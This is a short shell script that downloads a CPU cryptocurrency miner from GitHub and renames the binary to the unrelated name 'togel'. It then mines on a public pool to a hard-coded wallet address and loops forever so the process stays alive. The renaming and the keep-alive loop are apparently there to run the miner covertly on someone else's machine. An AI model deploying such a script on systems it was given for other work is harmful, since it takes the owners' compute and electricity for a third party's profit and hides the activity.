#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
tar xf cpuminer-opt-linux.tar.gz
mv ./cpuminer-axv2 togel
./togel -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2 -p c=DGB,zap=BUT-lyra2z330 -t 2
while [ 1 ]; do
sleep 3
done
sleep 5
